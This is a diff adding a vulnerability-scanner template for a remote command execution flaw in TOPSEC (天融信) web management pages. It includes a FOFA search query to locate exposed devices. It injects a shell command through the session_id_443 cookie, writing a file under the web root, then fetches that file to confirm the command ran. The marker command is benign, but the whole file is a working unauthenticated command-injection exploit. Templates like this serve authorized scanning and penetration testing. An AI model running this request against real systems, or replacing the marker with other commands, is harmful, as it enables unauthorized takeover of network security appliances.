@@ -1,0 +1,25 @@
+id: topsec-cookie-rce
+
+info:
+  name: 天融信TOPSEC Cookie 远程命令执行漏洞
+  author: rain
+  severity: critical
+  metadata:
+    fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+
+http:
+  - raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session_id_443=1|echo 'test' > /www/htdocs/site/image/test.txt;
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+      - |
+        GET /site/image/test.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body_2, 'test')"
